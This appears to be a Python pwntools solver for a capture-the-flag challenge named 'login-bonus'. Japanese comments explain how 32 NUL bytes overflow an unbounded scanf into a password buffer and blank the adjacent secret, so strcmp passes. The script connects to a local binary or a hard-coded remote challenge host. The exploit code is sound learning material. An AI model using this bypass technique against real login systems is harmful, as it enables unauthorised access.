from pwn import *

# === login-bonus solver ===
#
# 脆弱性: scanf("%[^\n]", password) に長さ制限がない (BOF)
#
# メモリ配置 (nm で確認):
#   password: 0x4040 (32バイト)
#   secret:   0x4060 (32バイト, password の直後)
#
# 攻撃:
#   scanf("%[^\n]") は NUL バイト (\x00) も読み取る。
#   \x00 を 32個送ると:
#     - password[0..31] = \x00 → password は空文字列 ""
#     - scanf が password[32] (= secret[0]) に NUL 終端を書き込む
#     - secret[0] = \x00 → secret も空文字列 ""
#   → strcmp("", "") == 0 → 認証成功！

context.binary = ELF('./login')

def conn():
    if args.REMOTE:
        return remote('34.170.146.252', 22777)
    else:
        return process('./login')

io = conn()

io.sendlineafter(b'Password: ', b'\x00' * 32)
io.recvuntil(b'[+] Success!\n')
log.success('Authentication bypassed!')

io.interactive()
